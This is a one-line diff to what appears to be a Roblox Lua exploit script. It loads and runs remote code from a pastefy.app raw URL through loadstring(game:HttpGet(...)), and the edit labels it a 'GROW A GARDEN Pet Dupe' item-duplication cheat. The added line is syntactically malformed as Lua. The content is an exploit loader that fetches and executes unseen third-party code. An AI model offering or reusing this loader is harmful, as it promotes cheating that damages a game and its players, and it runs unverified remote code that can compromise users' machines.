@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://pastefy.app/tRfN8BZw/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/tRfN8BZw/raw"))() GROW A GARDEN Pet Dupe
